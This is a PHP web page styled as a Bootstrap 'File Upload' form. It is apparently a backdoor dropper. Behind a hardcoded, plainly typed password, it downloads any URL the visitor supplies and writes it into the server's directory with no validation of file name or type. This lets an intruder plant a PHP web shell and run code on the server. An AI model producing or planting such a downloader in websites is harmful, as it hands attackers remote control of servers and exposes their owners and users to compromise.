<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="d-flex justify-content-center align-items-center vh-100 bg-light">
    <div class="card p-4 shadow-sm" style="width: 400px;">
        <h4 class="text-center mb-3">Upload File</h4>
        <form action="" method="POST">
            <div class="mb-3">
                <label for="link" class="form-label">Link:</label>
                <input type="text" id="link" name="link" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="pass" class="form-label">Password:</label>
                <input type="text" id="pass" name="pass" class="form-control" required>
            </div>
            <button type="submit" name="submit" class="btn btn-primary w-100">Upload</button>
        </form>
        <div class="mt-3 text-center text-danger">
            <?php
            if (isset($_POST["pass"])) {
                $pass = $_POST["pass"];
                $link = $_POST["link"];
                if (!empty($pass) && $pass == 12348 && !empty($link)) {
                    define('BUFSIZ', 4095);
                    $url = $link;
                    $rfile = fopen($url, 'r');
                    $lfile = fopen(basename($url), 'w');
                    while (!feof($rfile))
                        fwrite($lfile, fread($rfile, BUFSIZ), BUFSIZ);
                    fclose($rfile);
                    fclose($lfile);
                    echo '<span class="text-success">File Uploaded Successfully!</span>';
                } else {
                    echo 'Password is Not valid!';
                }
            }
            ?>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>